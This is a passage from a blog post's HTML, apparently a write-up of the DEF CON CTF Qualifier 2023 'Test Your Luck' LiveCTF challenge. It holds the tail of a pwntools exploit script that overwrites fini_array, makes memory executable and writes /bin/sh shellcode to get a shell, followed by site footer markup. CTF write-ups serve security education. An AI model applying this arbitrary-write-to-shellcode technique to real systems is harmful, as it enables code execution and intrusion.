class="number">0x4338</span></span><br><span class="line"></span><br><span class="line">p.send(p64(pie_base + <span class="number">0x4330</span>)) <span class="comment"># generate_random</span></span><br><span class="line">p.send(p64(pie_base + <span class="number">0x1370</span>)) <span class="comment"># mprotect_rwx</span></span><br><span class="line"></span><br><span class="line">p.send(p64(fini_array)) </span><br><span class="line">p.send(p64(pie_base + <span class="number">0x2000</span>)) <span class="comment"># one more</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit sub_2000</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment"># for main</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; one more sub_2000 &#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_addr = pie_base + <span class="number">0x2140</span> </span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(hex(len(shellcode))) # 0x30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p.send(p64(shellcode_addr + i*<span class="number">8</span>))</span><br><span class="line">    p.send(shellcode[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit sub_2000</span></span><br><span class="line">p.send(p8(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;./submitter&#x27;</span>)</span><br><span class="line"><span class="comment"># flag = p.recvline_contains(b&#x27;LiveCTF&#123;&#x27;).decode().strip()</span></span><br><span class="line"><span class="comment"># log.info(&#x27;Flag: %s&#x27;, flag)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230601-defcon2023-test-your-luck/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&text=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&is_video=false&description=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)&body=Check out this article: https://jiravvit.github.io/230601-defcon2023-test-your-luck/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&name=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&t=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2023
    jir4vvit
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'jiravvit-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
